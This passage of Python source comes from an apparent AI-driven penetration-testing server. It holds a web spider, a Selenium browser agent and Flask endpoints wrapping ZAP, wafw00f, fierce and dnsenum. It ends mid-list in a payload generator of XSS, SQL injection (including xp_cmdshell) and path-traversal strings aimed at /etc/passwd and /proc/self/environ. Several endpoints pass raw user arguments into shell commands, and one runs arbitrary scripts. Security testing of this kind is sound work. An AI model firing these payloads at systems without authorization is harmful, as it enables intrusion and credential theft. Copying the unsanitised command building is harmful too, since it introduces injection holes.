                    'description': description,
                    'url': url,
                    'matches': matches[:5]  # Limit matches
                })

        # Check for SQL injection indicators
        sql_errors = [
            'SQL syntax error',
            'mysql_fetch_array',
            'ORA-01756',
            'Microsoft OLE DB Provider',
            'PostgreSQL query failed'
        ]

        for error in sql_errors:
            if error.lower() in response.text.lower():
                vulns.append({
                    'type': 'sql_injection_indicator',
                    'severity': 'high',
                    'description': f'Potential SQL injection: {error}',
                    'url': url
                })

        self.vulnerabilities.extend(vulns)

    def _get_recent_vulns(self, limit: int = 10):
        """Get recent vulnerabilities found"""
        return self.vulnerabilities[-limit:] if self.vulnerabilities else []

    def spider_website(self, base_url: str, max_depth: int = 3, max_pages: int = 100) -> dict:
        """Spider website to discover endpoints and forms"""
        try:
            discovered_urls = set()
            forms = []
            to_visit = [(base_url, 0)]
            visited = set()

            while to_visit and len(discovered_urls) < max_pages:
                current_url, depth = to_visit.pop(0)

                if current_url in visited or depth > max_depth:
                    continue

                visited.add(current_url)

                try:
                    response = self.session.get(current_url, timeout=10)
                    if response.status_code == 200:
                        discovered_urls.add(current_url)

                        # Parse HTML for links and forms
                        soup = BeautifulSoup(response.text, 'html.parser')

                        # Find all links
                        for link in soup.find_all('a', href=True):
                            href_attr = link.get('href')
                            if isinstance(href_attr, list):
                                href = href_attr[0] if href_attr else ""
                            elif isinstance(href_attr, str):
                                href = href_attr
                            else:
                                href = ""
                            if not href:
                                continue
                            full_url = urljoin(current_url, href)

                            if urlparse(full_url).netloc == urlparse(base_url).netloc:
                                if full_url not in visited and depth < max_depth:
                                    to_visit.append((full_url, depth + 1))

                        # Find all forms
                        for form in soup.find_all('form'):
                            action_attr = form.get('action')
                            if isinstance(action_attr, list):
                                action_value = action_attr[0] if action_attr else ''
                            elif isinstance(action_attr, str):
                                action_value = action_attr
                            else:
                                action_value = ''

                            form_data = {
                                'url': current_url,
                                'action': urljoin(current_url, action_value),
                                'method': str(form.get('method') or 'GET').upper(),
                                'inputs': []
                            }

                            for input_tag in form.find_all(['input', 'textarea', 'select']):
                                form_data['inputs'].append({
                                    'name': input_tag.get('name', ''),
                                    'type': input_tag.get('type', 'text'),
                                    'value': input_tag.get('value', '')
                                })

                            forms.append(form_data)

                except Exception as e:
                    logger.warning(f"Error spidering {current_url}: {str(e)}")
                    continue

            return {
                'success': True,
                'discovered_urls': list(discovered_urls),
                'forms': forms,
                'total_pages': len(discovered_urls),
                'vulnerabilities': self._get_recent_vulns()
            }

        except Exception as e:
            logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'Spider', str(e))}")
            return {'success': False, 'error': str(e)}

class BrowserAgent:
    """AI-powered browser agent for web application testing and inspection"""

    def __init__(self):
        self.driver = None
        self.screenshots = []
        self.page_sources = []
        self.network_logs = []

    def setup_browser(self, headless: bool = True, proxy_port: Optional[int] = None):
        """Setup Chrome browser with security testing options"""
        try:
            chrome_options = Options()

            if headless:
                chrome_options.add_argument('--headless')

            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--user-agent=HexStrike-BrowserAgent/1.0 (Security Testing)')

            # Enable logging
            chrome_options.add_argument('--enable-logging')
            chrome_options.add_argument('--log-level=0')

            # Security testing options
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--ignore-ssl-errors')

            if proxy_port:
                chrome_options.add_argument(f'--proxy-server=http://127.0.0.1:{proxy_port}')

            # Enable network logging
            chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})

            self.driver = ChromeWebDriver(options=chrome_options)
            self.driver.set_page_load_timeout(30)

            logger.info(f"{ModernVisualEngine.format_tool_status('BrowserAgent', 'RUNNING', 'Chrome Browser Initialized')}")
            return True

        except Exception as e:
            logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'BrowserAgent', str(e))}")
            return False

    def navigate_and_inspect(self, url: str, wait_time: int = 5) -> dict:
        """Navigate to URL and perform comprehensive inspection"""
        try:
            if self.driver is None:
                if not self.setup_browser():
                    return {'success': False, 'error': 'Failed to setup browser'}

            driver = self.driver
            if driver is None:
                return {'success': False, 'error': 'Browser driver is not initialized'}

            nav_command = f'Navigate to {url}'
            logger.info(f"{ModernVisualEngine.format_command_execution(nav_command, 'STARTING')}")

            # Navigate to URL
            driver.get(url)
            time.sleep(wait_time)

            # Take screenshot
            screenshot_path = f"/tmp/hexstrike_screenshot_{int(time.time())}.png"
            driver.save_screenshot(screenshot_path)
            self.screenshots.append(screenshot_path)

            # Get page source
            page_source = driver.page_source
            self.page_sources.append({
                'url': url,
                'source': page_source[:50000],  # Limit size
                'timestamp': datetime.now().isoformat()
            })

            # Extract page information
            page_info = {
                'title': driver.title,
                'url': driver.current_url,
                'cookies': [{'name': c['name'], 'value': c['value'], 'domain': c['domain']}
                           for c in driver.get_cookies()],
                'local_storage': self._get_local_storage(),
                'session_storage': self._get_session_storage(),
                'forms': self._extract_forms(),
                'links': self._extract_links(),
                'inputs': self._extract_inputs(),
                'scripts': self._extract_scripts(),
                'network_requests': self._get_network_logs(),
                'console_errors': self._get_console_errors()
            }

            # Analyze for security issues
            security_analysis = self._analyze_page_security(page_source, page_info)
            # Merge extended passive analysis
            extended_passive = self._extended_passive_analysis(page_info, page_source)
            security_analysis['issues'].extend(extended_passive['issues'])
            security_analysis['total_issues'] = len(security_analysis['issues'])
            security_analysis['security_score'] = max(0, 100 - (security_analysis['total_issues'] * 5))
            security_analysis['passive_modules'] = extended_passive.get('modules', [])

            logger.info(f"{ModernVisualEngine.format_tool_status('BrowserAgent', 'SUCCESS', url)}")

            return {
                'success': True,
                'page_info': page_info,
                'security_analysis': security_analysis,
                'screenshot': screenshot_path,
                'timestamp': datetime.now().isoformat()
            }

        except Exception as e:
            logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'BrowserAgent', str(e))}")
            return {'success': False, 'error': str(e)}

    # ---------------------- Browser Deep Introspection Helpers ----------------------
    def _get_console_errors(self) -> list:
        """Collect console errors & warnings (if supported)"""
        try:
            driver = self.driver
            if driver is None:
                return []

            logs = driver.get_log('browser')
            out = []
            for entry in logs[-100:]:
                lvl = entry.get('level', '')
                if lvl in ('SEVERE', 'WARNING'):
                    out.append({'level': lvl, 'message': entry.get('message', '')[:500]})
            return out
        except Exception:
            return []

    def _analyze_cookies(self, cookies: list) -> list:
        issues = []
        for ck in cookies:
            name = ck.get('name','')
            # Selenium cookie dict may lack flags; attempt JS check if not present
            # (we keep lightweight – deeper flag detection requires CDP)
            if name.lower() in ('sessionid','phpseSSID','jsessionid') and len(ck.get('value','')) < 16:
                issues.append({'type':'weak_session_cookie','severity':'medium','description':f'Session cookie {name} appears short'})
        return issues

    def _analyze_security_headers(self, page_source: str, page_info: dict) -> list:
        # We cannot directly read response headers via Selenium; attempt a lightweight fetch with requests
        issues = []
        try:
            resp = requests.get(page_info.get('url',''), timeout=10, verify=False)
            headers = {k.lower():v for k,v in resp.headers.items()}
            required = {
                'content-security-policy':'CSP header missing (XSS mitigation)',
                'x-frame-options':'X-Frame-Options missing (Clickjacking risk)',
                'x-content-type-options':'X-Content-Type-Options missing (MIME sniffing risk)',
                'referrer-policy':'Referrer-Policy missing (leaky referrers)',
                'strict-transport-security':'HSTS missing (HTTPS downgrade risk)'
            }
            for key, desc in required.items():
                if key not in headers:
                    issues.append({'type':'missing_security_header','severity':'medium','description':desc,'header':key})
            # Weak CSP heuristic
            csp = headers.get('content-security-policy','')
            if csp and "unsafe-inline" in csp:
                issues.append({'type':'weak_csp','severity':'low','description':'CSP allows unsafe-inline scripts'})
        except Exception:
            pass
        return issues

    def _detect_mixed_content(self, page_info: dict) -> list:
        issues = []
        try:
            page_url = page_info.get('url','')
            if page_url.startswith('https://'):
                for req in page_info.get('network_requests', [])[:200]:
                    u = req.get('url','')
                    if u.startswith('http://'):
                        issues.append({'type':'mixed_content','severity':'medium','description':f'HTTP resource loaded over HTTPS page: {u[:100]}'})
        except Exception:
            pass
        return issues

    def _extended_passive_analysis(self, page_info: dict, page_source: str) -> dict:
        modules = []
        issues = []
        # Cookies
        cookie_issues = self._analyze_cookies(page_info.get('cookies', []))
        if cookie_issues:
            issues.extend(cookie_issues); modules.append('cookie_analysis')
        # Headers
        header_issues = self._analyze_security_headers(page_source, page_info)
        if header_issues:
            issues.extend(header_issues); modules.append('security_headers')
        # Mixed content
        mixed = self._detect_mixed_content(page_info)
        if mixed:
            issues.extend(mixed); modules.append('mixed_content')
        # Console errors may hint at DOM XSS sinks
        if page_info.get('console_errors'):
            modules.append('console_log_capture')
        return {'issues': issues, 'modules': modules}

    def run_active_tests(self, page_info: dict, payload: str = '<hexstrikeXSSTest123>') -> dict:
        """Very lightweight active tests (reflection check) - safe mode.
        Only GET forms with text inputs to avoid state-changing operations."""
        findings = []
        tested = 0
        for form in page_info.get('forms', []):
            if form.get('method','GET').upper() != 'GET':
                continue
            params = []
            for inp in form.get('inputs', [])[:3]:  # limit
                if inp.get('type','text') in ('text','search'):
                    params.append(f"{inp.get('name','param')}={payload}")
            if not params:
                continue
            action = form.get('action') or page_info.get('url','')
            if action.startswith('/'):
                # relative
                base = page_info.get('url','')
                try:
                    action = urljoin(base, action)
                except Exception:
                    pass
            test_url = action + ('&' if '?' in action else '?') + '&'.join(params)
            try:
                r = requests.get(test_url, timeout=8, verify=False)
                tested += 1
                if payload in r.text:
                    findings.append({'type':'reflected_xss','severity':'high','description':'Payload reflected in response','url':test_url})
            except Exception:
                continue
            if tested >= 5:
                break
        return {'active_findings': findings, 'tested_forms': tested}

    def _get_local_storage(self) -> dict:
        """Extract local storage data"""
        try:
            driver = self.driver
            if driver is None:
                return {}

            return driver.execute_script("""
                var storage = {};
                for (var i = 0; i < localStorage.length; i++) {
                    var key = localStorage.key(i);
                    storage[key] = localStorage.getItem(key);
                }
                return storage;
            """)
        except:
            return {}

    def _get_session_storage(self) -> dict:
        """Extract session storage data"""
        try:
            driver = self.driver
            if driver is None:
                return {}

            return driver.execute_script("""
                var storage = {};
                for (var i = 0; i < sessionStorage.length; i++) {
                    var key = sessionStorage.key(i);
                    storage[key] = sessionStorage.getItem(key);
                }
                return storage;
            """)
        except:
            return {}

    def _extract_forms(self) -> list:
        """Extract all forms from the page"""
        forms = []
        try:
            driver = self.driver
            if driver is None:
                return forms

            form_elements = driver.find_elements(By.TAG_NAME, 'form')
            for form in form_elements:
                form_data = {
                    'action': form.get_attribute('action') or '',
                    'method': form.get_attribute('method') or 'GET',
                    'inputs': []
                }

                inputs = form.find_elements(By.TAG_NAME, 'input')
                for input_elem in inputs:
                    form_data['inputs'].append({
                        'name': input_elem.get_attribute('name') or '',
                        'type': input_elem.get_attribute('type') or 'text',
                        'value': input_elem.get_attribute('value') or ''
                    })

                forms.append(form_data)
        except:
            pass

        return forms

    def _extract_links(self) -> list:
        """Extract all links from the page"""
        links = []
        try:
            driver = self.driver
            if driver is None:
                return links

            link_elements = driver.find_elements(By.TAG_NAME, 'a')
            for link in link_elements[:50]:  # Limit to 50 links
                href = link.get_attribute('href')
                if href:
                    links.append({
                        'href': href,
                        'text': link.text[:100]  # Limit text length
                    })
        except:
            pass

        return links

    def _extract_inputs(self) -> list:
        """Extract all input elements"""
        inputs = []
        try:
            driver = self.driver
            if driver is None:
                return inputs

            input_elements = driver.find_elements(By.TAG_NAME, 'input')
            for input_elem in input_elements:
                inputs.append({
                    'name': input_elem.get_attribute('name') or '',
                    'type': input_elem.get_attribute('type') or 'text',
                    'id': input_elem.get_attribute('id') or '',
                    'placeholder': input_elem.get_attribute('placeholder') or ''
                })
        except:
            pass

        return inputs

    def _extract_scripts(self) -> list:
        """Extract script sources and inline scripts"""
        scripts = []
        try:
            driver = self.driver
            if driver is None:
                return scripts

            script_elements = driver.find_elements(By.TAG_NAME, 'script')
            for script in script_elements[:20]:  # Limit to 20 scripts
                src = script.get_attribute('src')
                if src:
                    scripts.append({'type': 'external', 'src': src})
                else:
                    content = script.get_attribute('innerHTML')
                    if content and len(content) > 10:
                        scripts.append({
                            'type': 'inline',
                            'content': content[:1000]  # Limit content
                        })
        except:
            pass

        return scripts

    def _get_network_logs(self) -> list:
        """Get network request logs"""
        try:
            driver = self.driver
            if driver is None:
                return []

            logs = driver.get_log('performance')
            network_requests = []

            for log in logs[-50:]:  # Last 50 logs
                message = json.loads(log['message'])
                if message['message']['method'] == 'Network.responseReceived':
                    response = message['message']['params']['response']
                    network_requests.append({
                        'url': response['url'],
                        'status': response['status'],
                        'mimeType': response['mimeType'],
                        'headers': response.get('headers', {})
                    })

            return network_requests
        except:
            return []

    def _analyze_page_security(self, page_source: str, page_info: dict) -> dict:
        """Analyze page for security vulnerabilities"""
        issues = []

        # Check for sensitive data in local/session storage
        for storage_type, storage_data in [('localStorage', page_info.get('local_storage', {})),
                                          ('sessionStorage', page_info.get('session_storage', {}))]:
            for key, value in storage_data.items():
                if any(sensitive in key.lower() for sensitive in ['password', 'token', 'secret', 'key']):
                    issues.append({
                        'type': 'sensitive_data_storage',
                        'severity': 'high',
                        'description': f'Sensitive data found in {storage_type}: {key}',
                        'location': storage_type
                    })

        # Check for forms without CSRF protection
        for form in page_info.get('forms', []):
            has_csrf = any('csrf' in input_data['name'].lower() or 'token' in input_data['name'].lower()
                          for input_data in form['inputs'])
            if not has_csrf and form['method'].upper() == 'POST':
                issues.append({
                    'type': 'missing_csrf_protection',
                    'severity': 'medium',
                    'description': 'Form without CSRF protection detected',
                    'form_action': form['action']
                })

        # Check for inline JavaScript
        inline_scripts = [s for s in page_info.get('scripts', []) if s['type'] == 'inline']
        if inline_scripts:
            issues.append({
                'type': 'inline_javascript',
                'severity': 'low',
                'description': f'Found {len(inline_scripts)} inline JavaScript blocks',
                'count': len(inline_scripts)
            })

        return {
            'total_issues': len(issues),
            'issues': issues,
            'security_score': max(0, 100 - (len(issues) * 10))  # Simple scoring
        }

    def close_browser(self):
        """Close the browser instance"""
        if self.driver:
            self.driver.quit()
            self.driver = None
            logger.info(f"{ModernVisualEngine.format_tool_status('BrowserAgent', 'SUCCESS', 'Browser Closed')}")

# Global instances
http_framework = HTTPTestingFramework()
browser_agent = BrowserAgent()

@app.route("/api/tools/http-framework", methods=["POST"])
def http_framework_endpoint():
    """Enhanced HTTP testing framework (Burp Suite alternative)"""
    try:
        params = request.json
        action = params.get("action", "request")  # request, spider, proxy_history, set_rules, set_scope, repeater, intruder
        url = params.get("url", "")
        method = params.get("method", "GET")
        data = params.get("data", {})
        headers = params.get("headers", {})
        cookies = params.get("cookies", {})

        if action == "request":
            if not url:
                return jsonify({"error": "URL parameter is required for request action"}), 400

            request_command = f"{method} {url}"
            logger.info(f"{ModernVisualEngine.format_command_execution(request_command, 'STARTING')}")
            result = http_framework.intercept_request(url, method, data, headers, cookies)

            if result.get("success"):
                logger.info(f"{ModernVisualEngine.format_tool_status('HTTP-Framework', 'SUCCESS', url)}")
            else:
                logger.error(f"{ModernVisualEngine.format_tool_status('HTTP-Framework', 'FAILED', url)}")

            return jsonify(result)

        elif action == "spider":
            if not url:
                return jsonify({"error": "URL parameter is required for spider action"}), 400

            max_depth = params.get("max_depth", 3)
            max_pages = params.get("max_pages", 100)

            spider_command = f"Spider {url}"
            logger.info(f"{ModernVisualEngine.format_command_execution(spider_command, 'STARTING')}")
            result = http_framework.spider_website(url, max_depth, max_pages)

            if result.get("success"):
                total_pages = result.get("total_pages", 0)
                pages_info = f"{total_pages} pages"
                logger.info(f"{ModernVisualEngine.format_tool_status('HTTP-Spider', 'SUCCESS', pages_info)}")
            else:
                logger.error(f"{ModernVisualEngine.format_tool_status('HTTP-Spider', 'FAILED', url)}")

            return jsonify(result)

        elif action == "proxy_history":
            return jsonify({
                "success": True,
                "history": http_framework.proxy_history[-100:],  # Last 100 requests
                "total_requests": len(http_framework.proxy_history),
                "vulnerabilities": http_framework.vulnerabilities,
            })

        elif action == "set_rules":
            rules = params.get("rules", [])
            http_framework.set_match_replace_rules(rules)
            return jsonify({"success": True, "rules_set": len(rules)})

        elif action == "set_scope":
            scope_host = params.get("host")
            include_sub = params.get("include_subdomains", True)
            if not scope_host:
                return jsonify({"error": "host parameter required"}), 400
            http_framework.set_scope(scope_host, include_sub)
            return jsonify({"success": True, "scope": http_framework.scope})

        elif action == "repeater":
            request_spec = params.get("request") or {}
            result = http_framework.send_custom_request(request_spec)
            return jsonify(result)

        elif action == "intruder":
            if not url:
                return jsonify({"error": "URL parameter required"}), 400
            method = params.get("method", "GET")
            location = params.get("location", "query")
            fuzz_params = params.get("params", [])
            payloads = params.get("payloads", [])
            base_data = params.get("base_data", {})
            max_requests = params.get("max_requests", 100)
            result = http_framework.intruder_sniper(
                url, method, location, fuzz_params, payloads, base_data, max_requests
            )
            return jsonify(result)

        else:
            return jsonify({"error": f"Unknown action: {action}"}), 400

    except Exception as e:
        logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'HTTP-Framework', str(e))}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/browser-agent", methods=["POST"])
def browser_agent_endpoint():
    """AI-powered browser agent for web application inspection"""
    try:
        params = request.json or {}
        action = params.get("action", "navigate")  # navigate, screenshot, close
        url = params.get("url", "")
        headless = params.get("headless", True)
        wait_time = params.get("wait_time", 5)
        proxy_port = params.get("proxy_port")
        active_tests = params.get("active_tests", False)

        logger.info(
            f"{ModernVisualEngine.create_section_header('BROWSER AGENT', '🌐', 'CRIMSON')}"
        )

        if action == "navigate":
            if not url:
                return (
                    jsonify({"error": "URL parameter is required for navigate action"}),
                    400,
                )

            # Setup browser if not already done
            if not browser_agent.driver:
                setup_success = browser_agent.setup_browser(headless, proxy_port)
                if not setup_success:
                    return jsonify({"error": "Failed to setup browser"}), 500

            result = browser_agent.navigate_and_inspect(url, wait_time)
            if result.get("success") and active_tests:
                active_results = browser_agent.run_active_tests(
                    result.get("page_info", {})
                )
                result["active_tests"] = active_results
                if active_results["active_findings"]:
                    logger.warning(
                        ModernVisualEngine.format_error_card(
                            "WARNING",
                            "BrowserAgent",
                            f"Active findings: {len(active_results['active_findings'])}",
                        )
                    )
            return jsonify(result)

        elif action == "screenshot":
            if not browser_agent.driver:
                return (
                    jsonify(
                        {"error": "Browser not initialized. Use navigate action first."}
                    ),
                    400,
                )

            screenshot_path = f"/tmp/hexstrike_screenshot_{int(time.time())}.png"
            browser_agent.driver.save_screenshot(screenshot_path)

            return jsonify(
                {
                    "success": True,
                    "screenshot": screenshot_path,
                    "current_url": browser_agent.driver.current_url,
                    "timestamp": datetime.now().isoformat(),
                }
            )

        elif action == "close":
            browser_agent.close_browser()
            return jsonify({"success": True, "message": "Browser closed successfully"})

        elif action == "status":
            return jsonify(
                {
                    "success": True,
                    "browser_active": browser_agent.driver is not None,
                    "screenshots_taken": len(browser_agent.screenshots),
                    "pages_visited": len(browser_agent.page_sources),
                }
            )

        else:
            return jsonify({"error": f"Unknown action: {action}"}), 400

    except Exception as e:
        logger.error(
            f"{ModernVisualEngine.format_error_card('ERROR', 'BrowserAgent', str(e))}"
        )
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/burpsuite-alternative", methods=["POST"])
def burpsuite_alternative():
    """Comprehensive Burp Suite alternative combining HTTP framework and browser agent"""
    try:
        params = request.json
        target = params.get("target", "")
        scan_type = params.get("scan_type", "comprehensive")  # comprehensive, spider, passive, active
        headless = params.get("headless", True)
        max_depth = params.get("max_depth", 3)
        max_pages = params.get("max_pages", 50)

        if not target:
            return jsonify({"error": "Target parameter is required"}), 400

        logger.info(f"{ModernVisualEngine.create_section_header('BURP SUITE ALTERNATIVE', '🔥', 'BLOOD_RED')}")
        scan_message = f'Starting {scan_type} scan of {target}'
        logger.info(f"{ModernVisualEngine.format_highlighted_text(scan_message, 'RED')}")

        results = {
            'target': target,
            'scan_type': scan_type,
            'timestamp': datetime.now().isoformat(),
            'success': True
        }

        # Phase 1: Browser-based reconnaissance
        if scan_type in ['comprehensive', 'spider']:
            logger.info(f"{ModernVisualEngine.format_tool_status('BrowserAgent', 'RUNNING', 'Reconnaissance Phase')}")

            if not browser_agent.driver:
                browser_agent.setup_browser(headless)

            browser_result = browser_agent.navigate_and_inspect(target)
            results['browser_analysis'] = browser_result

        # Phase 2: HTTP spidering
        if scan_type in ['comprehensive', 'spider']:
            logger.info(f"{ModernVisualEngine.format_tool_status('HTTP-Spider', 'RUNNING', 'Discovery Phase')}")

            spider_result = http_framework.spider_website(target, max_depth, max_pages)
            results['spider_analysis'] = spider_result

        # Phase 3: Vulnerability analysis
        if scan_type in ['comprehensive', 'active']:
            logger.info(f"{ModernVisualEngine.format_tool_status('VulnScanner', 'RUNNING', 'Analysis Phase')}")

            # Test discovered endpoints
            discovered_urls = results.get('spider_analysis', {}).get('discovered_urls', [target])
            vuln_results = []

            for url in discovered_urls[:20]:  # Limit to 20 URLs
                test_result = http_framework.intercept_request(url)
                if test_result.get('success'):
                    vuln_results.append(test_result)

            results['vulnerability_analysis'] = {
                'tested_urls': len(vuln_results),
                'total_vulnerabilities': len(http_framework.vulnerabilities),
                'recent_vulnerabilities': http_framework._get_recent_vulns(20)
            }

        # Generate summary
        total_vulns = len(http_framework.vulnerabilities)
        vuln_summary = {}
        for vuln in http_framework.vulnerabilities:
            severity = vuln.get('severity', 'unknown')
            vuln_summary[severity] = vuln_summary.get(severity, 0) + 1

        results['summary'] = {
            'total_vulnerabilities': total_vulns,
            'vulnerability_breakdown': vuln_summary,
            'pages_analyzed': len(results.get('spider_analysis', {}).get('discovered_urls', [])),
            'security_score': max(0, 100 - (total_vulns * 5))
        }

        # Display summary with enhanced colors
        logger.info(f"{ModernVisualEngine.create_section_header('SCAN COMPLETE', '✅', 'SUCCESS')}")
        vuln_message = f'Found {total_vulns} vulnerabilities'
        color_choice = 'YELLOW' if total_vulns > 0 else 'GREEN'
        logger.info(f"{ModernVisualEngine.format_highlighted_text(vuln_message, color_choice)}")

        for severity, count in vuln_summary.items():
            logger.info(f"  {ModernVisualEngine.format_vulnerability_severity(severity, count)}")

        return jsonify(results)

    except Exception as e:
        logger.error(f"{ModernVisualEngine.format_error_card('CRITICAL', 'BurpAlternative', str(e))}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500
        logger.error(f"💥 Error in burpsuite endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/zap", methods=["POST"])
def zap():
    """Execute OWASP ZAP with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        scan_type = params.get("scan_type", "baseline")
        api_key = params.get("api_key", "")
        daemon = params.get("daemon", False)
        port = params.get("port", "8090")
        host = params.get("host", "0.0.0.0")
        format_type = params.get("format", "xml")
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")

        if not target and scan_type != "daemon":
            logger.warning("🎯 ZAP called without target parameter")
            return jsonify({
                "error": "Target parameter is required for scans"
            }), 400

        if daemon:
            command = f"zaproxy -daemon -host {host} -port {port}"
            if api_key:
                command += f" -config api.key={api_key}"
        else:
            command = f"zaproxy -cmd -quickurl {target}"

            if format_type:
                command += f" -quickout {format_type}"

            if output_file:
                command += f" -quickprogress -dir \"{output_file}\""

            if api_key:
                command += f" -config api.key={api_key}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting ZAP scan: {target}")
        result = execute_command(command)
        logger.info(f"📊 ZAP scan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in zap endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/wafw00f", methods=["POST"])
def wafw00f():
    """Execute wafw00f to identify and fingerprint WAF products with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🛡️ Wafw00f called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"wafw00f {target}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🛡️ Starting Wafw00f WAF detection: {target}")
        result = execute_command(command)
        logger.info(f"📊 Wafw00f completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in wafw00f endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/fierce", methods=["POST"])
def fierce():
    """Execute fierce for DNS reconnaissance with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        dns_server = params.get("dns_server", "")
        additional_args = params.get("additional_args", "")

        if not domain:
            logger.warning("🌐 Fierce called without domain parameter")
            return jsonify({
                "error": "Domain parameter is required"
            }), 400

        command = f"fierce --domain {domain}"

        if dns_server:
            command += f" --dns-servers {dns_server}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Fierce DNS recon: {domain}")
        result = execute_command(command)
        logger.info(f"📊 Fierce completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in fierce endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/dnsenum", methods=["POST"])
def dnsenum():
    """Execute dnsenum for DNS enumeration with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        dns_server = params.get("dns_server", "")
        wordlist = params.get("wordlist", "")
        additional_args = params.get("additional_args", "")

        if not domain:
            logger.warning("🌐 DNSenum called without domain parameter")
            return jsonify({
                "error": "Domain parameter is required"
            }), 400

        command = f"dnsenum {domain}"

        if dns_server:
            command += f" --dnsserver {dns_server}"

        if wordlist:
            command += f" --file {wordlist}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting DNSenum: {domain}")
        result = execute_command(command)
        logger.info(f"📊 DNSenum completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in dnsenum endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# Python Environment Management Endpoints
@app.route("/api/python/install", methods=["POST"])
def install_python_package():
    """Install a Python package in a virtual environment"""
    try:
        params = request.json
        package = params.get("package", "")
        env_name = params.get("env_name", "default")

        if not package:
            return jsonify({"error": "Package name is required"}), 400

        logger.info(f"📦 Installing Python package: {package} in env {env_name}")
        success = env_manager.install_package(env_name, package)

        if success:
            return jsonify({
                "success": True,
                "message": f"Package {package} installed successfully",
                "env_name": env_name
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Failed to install package {package}"
            }), 500

    except Exception as e:
        logger.error(f"💥 Error installing Python package: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/python/execute", methods=["POST"])
def execute_python_script():
    """Execute a Python script in a virtual environment"""
    try:
        params = request.json
        script = params.get("script", "")
        env_name = params.get("env_name", "default")
        filename = params.get("filename", f"script_{int(time.time())}.py")

        if not script:
            return jsonify({"error": "Script content is required"}), 400

        # Create script file
        script_result = file_manager.create_file(filename, script)
        if not script_result["success"]:
            return jsonify(script_result), 500

        # Get Python path for environment
        python_path = env_manager.get_python_path(env_name)
        script_path = script_result["path"]

        # Execute script
        command = f"{python_path} {script_path}"
        logger.info(f"🐍 Executing Python script in env {env_name}: {filename}")
        result = execute_command(command, use_cache=False)

        # Clean up script file
        file_manager.delete_file(filename)

        result["env_name"] = env_name
        result["script_filename"] = filename
        logger.info(f"📊 Python script execution completed")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error executing Python script: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# AI-POWERED PAYLOAD GENERATION (v5.0 ENHANCEMENT) UNDER DEVELOPMENT
# ============================================================================

class AIPayloadGenerator:
    """AI-powered payload generation system with contextual intelligence"""

    def __init__(self):
        self.payload_templates = {
            "xss": {
                "basic": ["<script>alert('XSS')</script>", "javascript:alert('XSS')", "'><script>alert('XSS')</script>"],
                "advanced": [
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
                    "\"><script>alert('XSS')</script><!--",
                    "<iframe src=\"javascript:alert('XSS')\">",
                    "<body onload=alert('XSS')>"
                ],
                "bypass": [
                    "<ScRiPt>alert('XSS')</ScRiPt>",
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "<img src=\"javascript:alert('XSS')\">",
                    "<svg/onload=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<details ontoggle=alert('XSS')>"
                ]
            },
            "sqli": {
                "basic": ["' OR '1'='1", "' OR 1=1--", "admin'--", "' UNION SELECT NULL--"],
                "advanced": [
                    "' UNION SELECT 1,2,3,4,5--",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "' AND (SELECT SUBSTRING(@@version,1,10))='Microsoft'--",
                    "'; EXEC xp_cmdshell('whoami')--",
                    "' OR 1=1 LIMIT 1--",
                    "' AND 1=(SELECT COUNT(*) FROM tablenames)--"
                ],
                "time_based": [
                    "'; WAITFOR DELAY '00:00:05'--",
                    "' OR (SELECT SLEEP(5))--",
                    "'; SELECT pg_sleep(5)--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
                ]
            },
            "lfi": {
                "basic": ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],
                "advanced": [
                    "....//....//....//etc/passwd",
                    "..%2F..%2F..%2Fetc%2Fpasswd",
                    "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
                    "/var/log/apache2/access.log",
                    "/proc/self/environ",
